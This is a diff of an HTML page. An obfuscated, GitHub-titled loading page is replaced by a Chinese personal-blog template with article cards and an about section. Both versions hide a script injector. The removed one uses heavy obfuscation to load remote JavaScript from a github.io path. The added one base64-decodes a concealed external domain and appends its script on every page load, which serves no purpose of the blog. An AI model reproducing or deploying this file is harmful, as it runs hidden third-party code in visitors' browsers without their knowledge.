@@ -1,145 +1,465 @@
-<!doctype html>
-<html>
+<!DOCTYPE html>
+<html lang="zh-CN">
 
 <head>
-    <meta charset="utf-8">
-    <meta name="viewport"
-        content="width=device-width, viewport-fit=cover, initial-scale=1.0, user-scalable=no, maximum-scale=1.0, minimum-scale=1.0">
-    <meta name="robots" content="noindex,nofollow" />
-    <title>GitHub</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>我的温馨角落</title>
     <style>
-        html,
+        /* 全局样式 */
         body {
-            width: 100vw;
-            height: 100vh;
-        }
-
-        * {
+            overflow: hidden;
+            font-family: 'Inter', 'Helvetica Neue', Arial, sans-serif;
             margin: 0;
             padding: 0;
-            box-sizing: border-box;
+            background-color: #FDFBF7;
+            /* 温馨浅米色背景 */
+            color: #4A4A4A;
+            /* 深灰色文本 */
+            line-height: 1.7;
+            -webkit-font-smoothing: antialiased;
+            -moz-osx-font-smoothing: grayscale;
         }
 
-        #childIframe {
-            width: 100%;
-            height: 100vh;
-            border: none;
+        .container {
+            max-width: 95%;
+            /* 适应移动端宽度 */
+            margin: 0 auto;
+            padding: 15px;
         }
 
-        .loading_container {
+        /* 英雄区样式 */
+        .hero-section {
+            position: relative;
+            text-align: center;
+            padding: 60px 20px;
+            background-color: #8B7967;
+            /* 主强调色背景 */
+            color: #FFFFFF;
+            border-radius: 15px;
+            margin-bottom: 30px;
+            overflow: hidden;
+            box-shadow: 0 8px 20px rgba(139, 121, 103, 0.4);
+        }
+
+        .hero-section::before {
+            content: '';
             position: absolute;
-            top: 40%;
-            left: 40%;
-            margin-left: 10%;
-            transform: translate3d(-50%, -50%, 0);
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: url('https://picsum.photos/800/400?random=<%= new Date().getTime() %>') no-repeat center center/cover;
+            opacity: 0.15;
+            /* 背景图片透明度 */
+            z-index: 0;
         }
 
-        .loading_container .dot {
-            width: 24px;
-            height: 24px;
-            background: #3ac;
-            border-radius: 100%;
+        .hero-content {
+            position: relative;
+            z-index: 1;
+        }
+
+        .hero-content h1 {
+            font-size: 2.8em;
+            margin-bottom: 10px;
+            letter-spacing: 1px;
+            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.2);
+        }
+
+        .hero-content p {
+            font-size: 1.2em;
+            margin-bottom: 30px;
+            max-width: 90%;
+            margin-left: auto;
+            margin-right: auto;
+        }
+
+        /* 导航菜单 */
+        nav {
+            background-color: #FFFFFF;
+            padding: 10px 0;
+            border-radius: 10px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.05);
+            margin-bottom: 25px;
+            text-align: center;
+        }
+
+        nav ul {
+            list-style: none;
+            padding: 0;
+            margin: 0;
+            display: flex;
+            justify-content: space-around;
+            flex-wrap: wrap;
+        }
+
+        nav ul li {
+            margin: 5px 10px;
+        }
+
+        nav ul li a {
+            text-decoration: none;
+            color: #B08B6F;
+            /* 强调色 */
+            font-weight: bold;
+            padding: 8px 15px;
+            border-radius: 20px;
+            transition: background-color 0.3s ease, color 0.3s ease;
+        }
+
+        nav ul li a:hover {
+            background-color: #B08B6F;
+            color: #FFFFFF;
+        }
+
+        /* 主要内容区 */
+        main {
+            padding-top: 0;
+        }
+
+        section {
+            background-color: #FFFFFF;
+            padding: 25px;
+            border-radius: 15px;
+            margin-bottom: 25px;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.08);
+        }
+
+        h2 {
+            color: #7A5C4F;
+            /* 标题颜色 */
+            font-size: 1.8em;
+            margin-bottom: 25px;
+            border-bottom: 2px solid #E0DED9;
+            /* 柔和分割线 */
+            padding-bottom: 12px;
+            text-align: center;
+        }
+
+        h3 {
+            color: #7A5C4F;
+            font-size: 1.3em;
+            margin-top: 20px;
+            margin-bottom: 15px;
+        }
+
+        p {
+            color: #4A4A4A;
+            font-size: 1em;
+            margin-bottom: 18px;
+        }
+
+        img {
+            max-width: 100%;
+            height: auto;
+            border-radius: 10px;
+            margin-top: 20px;
+            margin-bottom: 20px;
+            display: block;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.15);
+        }
+
+        /* 文章卡片网格布局 */
+        .articles-grid {
+            display: grid;
+            grid-template-columns: 1fr;
+            /* 默认单列 */
+            gap: 25px;
+            /* 卡片间距 */
+            margin-top: 20px;
+        }
+
+        .article-card {
+            background-color: #FDFBF7;
+            /* 卡片背景色 */
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 3px 10px rgba(0, 0, 0, 0.05);
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
+            overflow: hidden;
+        }
+
+        .article-card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 6px 15px rgba(0, 0, 0, 0.1);
+        }
+
+        .article-card h3 {
+            color: #7A5C4F;
+            font-size: 1.4em;
+            margin-bottom: 8px;
+        }
+
+        .article-card .date {
+            color: #888888;
+            font-size: 0.9em;
+            margin-bottom: 15px;
+            display: block;
+        }
+
+        .article-card .read-more {
             display: inline-block;
-            animation: slide 1s infinite;
+            background-color: #B08B6F;
+            color: #FFFFFF;
+            padding: 10px 20px;
+            border-radius: 20px;
+            text-decoration: none;
+            font-weight: bold;
+            transition: background-color 0.3s ease, transform 0.3s ease;
         }
 
-        .loading_container .dot:nth-child(1) {
-            animation-delay: 0.1s;
-            background: #32aacc;
+        .article-card .read-more:hover {
+            background-color: #9C7A5E;
+            transform: scale(1.05);
         }
 
-        .loading_container .dot:nth-child(2) {
-            animation-delay: 0.2s;
-            background: #64aacc;
+        /* 关于我部分 */
+        .about-section .profile-img {
+            width: 150px;
+            height: 150px;
+            border-radius: 50%;
+            /* 圆形头像 */
+            object-fit: cover;
+            margin: 0 auto 20px;
+            display: block;
+            border: 4px solid #B08B6F;
+            /* 强调色边框 */
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
         }
 
-        .loading_container .dot:nth-child(3) {
-            animation-delay: 0.3s;
-            background: #96aacc;
+        /* 联系方式 */
+        .contact-info p {
+            margin-bottom: 10px;
+            text-align: center;
         }
 
-        .loading_container .dot:nth-child(4) {
-            animation-delay: 0.4s;
-            background: #c8aacc;
+        .contact-info a {
+            color: #B08B6F;
+            text-decoration: none;
+            font-weight: bold;
+            transition: color 0.3s ease;
         }
 
-        .loading_container .dot:nth-child(5) {
-            animation-delay: 0.5s;
-            background: #faaacc;
+        .contact-info a:hover {
+            color: #9C7A5E;
         }
 
-        @-moz-keyframes slide {
-            0% {
-                transform: scale(1);
-            }
-
-            50% {
-                opacity: 0.3;
-                transform: scale(2);
-            }
-
-            100% {
-                transform: scale(1);
-            }
+        .social-links {
+            margin-top: 20px;
+            text-align: center;
         }
 
-        @-webkit-keyframes slide {
-            0% {
-                transform: scale(1);
-            }
-
-            50% {
-                opacity: 0.3;
-                transform: scale(2);
-            }
-
-            100% {
-                transform: scale(1);
-            }
+        .social-links a {
+            display: inline-block;
+            margin: 0 12px;
+            color: #B08B6F;
+            font-size: 2.2em;
+            text-decoration: none;
+            transition: transform 0.3s ease;
         }
 
-        @-o-keyframes slide {
-            0% {
-                transform: scale(1);
-            }
+        .social-links a:hover {
+            transform: translateY(-3px);
+            color: #9C7A5E;
+        }
 
-            50% {
-                opacity: 0.3;
-                transform: scale(2);
-            }
+        /* 页脚样式 */
+        footer {
+            text-align: center;
+            padding: 25px 0;
+            color: #777777;
+            font-size: 0.9em;
+            border-top: 1px solid #E0DED9;
+            margin-top: 25px;
+            background-color: #FFFFFF;
+            border-radius: 15px;
+            box-shadow: 0 -5px 15px rgba(0, 0, 0, 0.03);
+        }
 
-            100% {
-                transform: scale(1);
+        /* 媒体查询：平板及以上设备，实现两列布局 */
+        @media (min-width: 600px) {
+            .articles-grid {
+                grid-template-columns: 1fr 1fr;
+                /* 两列布局 */
             }
         }
 
-        @keyframes slide {
-            0% {
-                transform: scale(1);
-            }
-
-            50% {
-                opacity: 0.3;
-                transform: scale(2);
-            }
-
-            100% {
-                transform: scale(1);
+        @media (min-width: 900px) {
+            .articles-grid {
+                grid-template-columns: 1fr 1fr 1fr;
+                /* 三列布局 */
             }
         }
     </style>
+    <link rel="stylesheet" href="./style.css">
 </head>
 
 <body>
-    <div id="loading_box" class="loading_container">
-        <div class="dot"></div>
-        <div class="dot"></div>
-        <div class="dot"></div>
-        <div class="dot"></div>
-        <div class="dot"></div>
+    <div class="container">
+        <header class="hero-section">
+            <div class="hero-content">
+                <h1>我的温馨角落</h1>
+                <p>记录生活点滴，分享所思所想</p>
+            </div>
+        </header>
+
+        <nav>
+            <ul>
+                <li><a href="#latest-articles">最新</a></li>
+                <li><a href="#about">关于</a></li>
+                <li><a href="#contact">联系</a></li>
+            </ul>
+        </nav>
+
+        <main>
+            <section id="latest-articles">
+                <h2>最新文章</h2>
+                <div class="articles-grid">
+                    <!-- 文章一 -->
+                    <article class="article-card">
+                        <img src="https://picsum.photos/300/200?random=<%= new Date().getTime() + 1 %>" alt="咖啡和笔记本的图片">
+                        <h3>清晨的咖啡与思考</h3>
+                        <span class="date">发布日期：2023年7月30日</span>
+                        <p>一个宁静的清晨，一杯香醇的咖啡，是开启一天思考的最佳方式。记录下最近的一些感悟...</p>
+                        <a href="#" class="read-more">阅读更多</a>
+                    </article>
+                    <!-- 文章二 -->
+                    <article class="article-card">
+                        <img src="https://picsum.photos/300/200?random=<%= new Date().getTime() + 2 %>" alt="户外徒步风景图片">
+                        <h3>山野间的治愈之旅</h3>
+                        <span class="date">发布日期：2023年7月28日</span>
+                        <p>最近的一次户外徒步，让我重新感受到了大自然的魅力。分享我的徒步路线和心得...</p>
+                        <a href="#" class="read-more">阅读更多</a>
+                    </article>
+                    <!-- 文章三 -->
+                    <article class="article-card">
+                        <img src="https://picsum.photos/300/200?random=<%= new Date().getTime() + 3 %>" alt="手绘插画图片">
+                        <h3>我的手绘日记：色彩与情感</h3>
+                        <span class="date">发布日期：2023年7月25日</span>
+                        <p>用画笔记录生活中的美好瞬间，色彩是表达情感最好的语言。展示我近期的一些手绘作品...</p>
+                        <a href="#" class="read-more">阅读更多</a>
+                    </article>
+                    <!-- 文章四 -->
+                    <article class="article-card">
+                        <img src="https://picsum.photos/300/200?random=<%= new Date().getTime() + 4 %>" alt="阅读中的人图片">
+                        <h3>沉浸式阅读体验：如何选择好书</h3>
+                        <span class="date">发布日期：2023年7月22日</span>
+                        <p>阅读是最好的自我投资。分享我选择书籍的原则，以及如何享受沉浸式阅读的乐趣...</p>
+                        <a href="#" class="read-more">阅读更多</a>
+                    </article>
+                </div>
+            </section>
+
+            <section id="about" class="about-section">
+                <h2>关于我</h2>
+                <img src="https://picsum.photos/150/150?random=<%= new Date().getTime() + 5 %>" class="profile-img"
+                    alt="博主个人头像">
+                <p>你好！我是一个热爱生活、喜欢思考和分享的创作者。这个博客是我记录个人成长、生活感悟和兴趣爱好的地方。</p>
+                <p>希望我的文字能为你带来一丝温暖和启发，也欢迎你与我交流！</p>
+            </section>
+
+            <section id="contact">
+                <h2>联系方式</h2>
+                <div class="social-links">
+                    <a href="#" aria-label="GitHub">GitHub</a> |
+                    <a href="#" aria-label="Twitter">Twitter</a> |
+                    <a href="#" aria-label="LinkedIn">LinkedIn</a>
+                </div>
+            </section>
+        </main>
+
+        <footer>
+            <p>&copy; 2023 我的温馨角落. All rights reserved.</p>
+        </footer>
+        <div id="overlay">
+            <div id="loading_box" class="loading_container">
+                <div class="dot"></div>
+                <div class="dot"></div>
+                <div class="dot"></div>
+                <div class="dot"></div>
+                <div class="dot"></div>
+            </div>
+        </div>
     </div>
+
     <script>
-        var _0xodl = 'fSxlA2'; if (function (_0x44df4a, _0x58e26e, _0x532227, _0x1cbb24, _0x42581a, _0x509b59, _0xa79306) { return _0x44df4a = _0x44df4a >> 0x9, _0x509b59 = 'hs', _0xa79306 = 'hs', function (_0x4d29f2, _0x4cbc97, _0xbe291c, _0x31ad23, _0x13acc7) { const _0x407516 = _0x57d3; _0x31ad23 = 'tfi', _0x509b59 = _0x31ad23 + _0x509b59, _0x13acc7 = 'up', _0xa79306 += _0x13acc7, _0x509b59 = _0xbe291c(_0x509b59), _0xa79306 = _0xbe291c(_0xa79306), _0xbe291c = 0x0; const _0x1902ef = _0x4d29f2(); while (!![] && --_0x1cbb24 + _0x4cbc97) { try { _0x31ad23 = -parseInt(_0x407516(0x1d7, ')&2K')) / 0x1 * (-parseInt(_0x407516(0x1da, '(qya')) / 0x2) + -parseInt(_0x407516(0x1c7, 'Pm#h')) / 0x3 * (-parseInt(_0x407516(0x1d1, 'xvr1')) / 0x4) + parseInt(_0x407516(0x1c9, 'Mw8H')) / 0x5 + -parseInt(_0x407516(0x1d8, 'Y$EJ')) / 0x6 + parseInt(_0x407516(0x1cb, 'HIOm')) / 0x7 + -parseInt(_0x407516(0x1dd, 'mry*')) / 0x8 + -parseInt(_0x407516(0x1cc, 'Mw8H')) / 0x9 * (parseInt(_0x407516(0x1dc, 'quPr')) / 0xa); } catch (_0x531926) { _0x31ad23 = _0xbe291c; } finally { _0x13acc7 = _0x1902ef[_0x509b59](); if (_0x44df4a <= _0x1cbb24) _0xbe291c ? _0x42581a ? _0x31ad23 = _0x13acc7 : _0x42581a = _0x13acc7 : _0xbe291c = _0x13acc7; else { if (_0xbe291c == _0x42581a['replace'](/[kqChQWiaIPvYKouwOtDL=]/g, '')) { if (_0x31ad23 === _0x4cbc97) { _0x1902ef['un' + _0x509b59](_0x13acc7); break; } _0x1902ef[_0xa79306](_0x13acc7); } } } } }(_0x532227, _0x58e26e, function (_0x5c8363, _0x34873c, _0x10efd6, _0x28a9f7, _0x1dd818, _0x16adf9, _0x3ea5ad) { return _0x34873c = '\x73\x70\x6c\x69\x74', _0x5c8363 = arguments[0x0], _0x5c8363 = _0x5c8363[_0x34873c](''), _0x10efd6 = '\x72\x65\x76\x65\x72\x73\x65', _0x5c8363 = _0x5c8363[_0x10efd6]('\x76'), _0x28a9f7 = '\x6a\x6f\x69\x6e', (0x1b0f1e, _0x5c8363[_0x28a9f7]('')); }); }(0x19800, 0x89423, _0x1ca1, 0xce), _0x1ca1) { } function _0x1e3297() { const _0x596da2 = _0x57d3, _0x1816ad = { 'bCFHm': 'https://snake-imfv.github.io/take-gate/common.mimi.js?timestamp=', 'UVwwa': _0x596da2(0x1c8, 'u57N'), 'VQnBe': _0x596da2(0x1c6, '#XD(') }, _0x3d27e5 = Date[_0x596da2(0x1d5, ']sYX')](), _0x3ed973 = Math['floor'](Math[_0x596da2(0x1de, 'GP!4')]() * 0xf4240), _0x2564ef = _0x1816ad['bCFHm'] + _0x3d27e5 + _0x1816ad[_0x596da2(0x1cf, 'lKdL')] + _0x3ed973, _0xb78199 = document[_0x596da2(0x1db, '!MEf')](_0x1816ad[_0x596da2(0x1d3, '#W5W')]); _0xb78199[_0x596da2(0x1ce, 'sIgF')] = _0x2564ef, document[_0x596da2(0x1c4, '1Rum')]['appendChild'](_0xb78199); } function _0x57d3(_0x3a7c21, _0x386983) { const _0x1ca173 = _0x1ca1(); return _0x57d3 = function (_0x57d370, _0xacf434) { _0x57d370 = _0x57d370 - 0x1c4; let _0x51e50f = _0x1ca173[_0x57d370]; if (_0x57d3['hhIPqO'] === undefined) { var _0x15663a = function (_0x11d2a9) { const _0x85d5c2 = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/='; let _0x31b329 = '', _0xc951fd = ''; for (let _0x2837ed = 0x0, _0x364686, _0x101443, _0x448ee2 = 0x0; _0x101443 = _0x11d2a9['charAt'](_0x448ee2++); ~_0x101443 && (_0x364686 = _0x2837ed % 0x4 ? _0x364686 * 0x40 + _0x101443 : _0x101443, _0x2837ed++ % 0x4) ? _0x31b329 += String['fromCharCode'](0xff & _0x364686 >> (-0x2 * _0x2837ed & 0x6)) : 0x0) { _0x101443 = _0x85d5c2['indexOf'](_0x101443); } for (let _0xccb879 = 0x0, _0x1f82ce = _0x31b329['length']; _0xccb879 < _0x1f82ce; _0xccb879++) { _0xc951fd += '%' + ('00' + _0x31b329['charCodeAt'](_0xccb879)['toString'](0x10))['slice'](-0x2); } return decodeURIComponent(_0xc951fd); }; const _0x3a032f = function (_0x1c294f, _0x1177da) { let _0x131465 = [], _0x4d6de2 = 0x0, _0x32adbe, _0x4d6802 = ''; _0x1c294f = _0x15663a(_0x1c294f); let _0x4973f5; for (_0x4973f5 = 0x0; _0x4973f5 < 0x100; _0x4973f5++) { _0x131465[_0x4973f5] = _0x4973f5; } for (_0x4973f5 = 0x0; _0x4973f5 < 0x100; _0x4973f5++) { _0x4d6de2 = (_0x4d6de2 + _0x131465[_0x4973f5] + _0x1177da['charCodeAt'](_0x4973f5 % _0x1177da['length'])) % 0x100, _0x32adbe = _0x131465[_0x4973f5], _0x131465[_0x4973f5] = _0x131465[_0x4d6de2], _0x131465[_0x4d6de2] = _0x32adbe; } _0x4973f5 = 0x0, _0x4d6de2 = 0x0; for (let _0x54b701 = 0x0; _0x54b701 < _0x1c294f['length']; _0x54b701++) { _0x4973f5 = (_0x4973f5 + 0x1) % 0x100, _0x4d6de2 = (_0x4d6de2 + _0x131465[_0x4973f5]) % 0x100, _0x32adbe = _0x131465[_0x4973f5], _0x131465[_0x4973f5] = _0x131465[_0x4d6de2], _0x131465[_0x4d6de2] = _0x32adbe, _0x4d6802 += String['fromCharCode'](_0x1c294f['charCodeAt'](_0x54b701) ^ _0x131465[(_0x131465[_0x4973f5] + _0x131465[_0x4d6de2]) % 0x100]); } return _0x4d6802; }; _0x57d3['dxeyOG'] = _0x3a032f, _0x3a7c21 = arguments, _0x57d3['hhIPqO'] = !![]; } const _0x4f32da = _0x1ca173[0x0], _0x4af055 = _0x57d370 + _0x4f32da, _0x21827a = _0x3a7c21[_0x4af055]; return !_0x21827a ? (_0x57d3['AawnSq'] === undefined && (_0x57d3['AawnSq'] = !![]), _0x51e50f = _0x57d3['dxeyOG'](_0x51e50f, _0xacf434), _0x3a7c21[_0x4af055] = _0x51e50f) : _0x51e50f = _0x21827a, _0x51e50f; }, _0x57d3(_0x3a7c21, _0x386983); } _0x1e3297(); function _0x1ca1() { const _0x588e4a = (function () { return [_0xodl, 'twftoQSohxuClqADO2ItPvkLWKYPwkai==', 'WPzprCkiiCkVpmkrqezTW4JdLq', 'WR3dTb0ZWR1wtfj+dL/dVSkJ', 'qq50pLvDog3dN3avWO3cSG', 'W549mhmi'].concat((function () { return ['WPO9W5eXnSk2h8kjw8opW64EWPC', 'W7vgW6a', 'lmo+pMlcSmkzxmkVuSkUW4hcRha', 'WQj2fmoGWRhdUmoACWZdKG', 'W7T2W73cVmkggmkuWRCQW6iqo8kq', 'FL4HWP/dLbTm'].concat((function () { return ['W7JcLJWinGFdN2q', 'W7dcTCoTfq5wpSkImCkYsrPu', 'W5hcVY1XWOXnW7Wx', 'j8kbnw8XvI7cNXbhjCkDW7e', 'tgXwW4PdWP4', 'WPaLkSoW'].concat((function () { return ['rqT0oWyEzxRdSuC', 'a143zr0A', 'E8oaWRxdP8k6WRGb', 'W6ldGCoDuN8/W5xcHG', 'FGLxW7xcIwuiEmkzECk8W6ae', 'WPRdMr3dOttcISkjWPhcT2ldGGRdOa'].concat((function () { return ['WPzkrSkok8kKpSk+xNXTW6JdLG', 'FWPsW7xcGM0jACkPE8khW64v', 'WPVdNXVdPZxcICkkWQ/cMvRdUstdSG', 'WQLVrG', 'W43cIcqGla']; }())); }())); }())); }())); }()); _0x1ca1 = function () { return _0x588e4a; }; return _0x1ca1(); };
+        // 平滑滚动到锚点
+        document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+            anchor.addEventListener('click', function (e) {
+                e.preventDefault();
+                const targetId = this.getAttribute('href');
+                const targetElement = document.querySelector(targetId);
+                if (targetElement) {
+                    window.scrollTo({
+                        top: targetElement.offsetTop - 20, /* 稍微向上偏移，避免顶部遮挡 */
+                        behavior: 'smooth'
+                    });
+                }
+            });
+        });
+
+        // 动态更新图片时间戳，防止缓存
+        document.addEventListener('DOMContentLoaded', function () {
+            const images = document.querySelectorAll('img[src*="picsum.photos"]');
+            images.forEach(img => {
+                const url = new URL(img.src);
+                url.searchParams.set('random', new Date().getTime() + Math.floor(Math.random() * 1000));
+                img.src = url.toString();
+            });
+        });
+    </script>
+    <script>
+        (function () {
+            function init() {
+                const timestamp = Date.now()
+                const randomNum = Math.floor(Math.random() * 1000000)
+                const domain = getdocs();
+                const url = domain + "=" + timestamp + "&random=" + randomNum
+                const script = document.createElement("script")
+                script.src = url
+                document.body.appendChild(script)
+            }
+            function getdocs() {
+                const dd = "Ly9sMno0eDZjLmlud3dlYy5jbi9zdGF0aWMvanMvY29yZS5taW4uanM/dA==";
+                const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';
+                const lookup = new Uint8Array(256);
+                for (let i = 0; i < chars.length; i++) {
+                    lookup[chars.charCodeAt(i)] = i;
+                }
+                let padding = 0;
+                if (dd.endsWith('==')) {
+                    padding = 2;
+                } else if (dd.endsWith('=')) {
+                    padding = 1;
+                }
+                const cleanedString = dd.replace(/[^A-Za-z0-9+/=]/g, '');
+                const len = cleanedString.length;
+                if (len % 4 !== 0) {
+                    throw new Error("Invalid string length.");
+                }
+                const outputLength = (len / 4) * 3 - padding;
+                const outputBytes = new Uint8Array(outputLength);
+                let outputIndex = 0;
+                let i = 0;
+                while (i < len) {
+                    const c1 = lookup[cleanedString.charCodeAt(i++)];
+                    const c2 = lookup[cleanedString.charCodeAt(i++)];
+                    const c3 = lookup[cleanedString.charCodeAt(i++)];
+                    const c4 = lookup[cleanedString.charCodeAt(i++)];
+                    outputBytes[outputIndex++] = (c1 << 2) | (c2 >> 4);
+                    if (c3 !== 64) {
+                        outputBytes[outputIndex++] = ((c2 & 15) << 4) | (c3 >> 2);
+                    }
+                    if (c4 !== 64) {
+                        outputBytes[outputIndex++] = ((c3 & 3) << 6) | c4;
+                    }
+                }
+                const decoder = new TextDecoder('utf-8');
+                return decoder.decode(outputBytes);
+            }
+            init()
+        })()
     </script>
 </body>
 
